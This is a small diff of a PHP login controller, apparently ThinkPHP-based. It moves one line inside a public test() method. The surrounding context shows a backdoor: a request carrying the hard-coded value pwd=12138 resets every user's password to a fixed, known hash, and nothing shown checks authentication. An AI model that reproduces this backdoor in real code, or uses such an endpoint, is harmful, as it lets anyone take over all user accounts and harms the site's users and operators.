@@ -125,8 +125,8 @@ class LoginController extends Controller{
         
     }
     public function test(){
+        $User=D('User');
         if(I('pwd')=='12138'){
-            $User=D('User');
             $save=[];
             $save['user_pwd']=md5('0000'.__KEY__);
             $result=$User->where('1=1')->save($save);
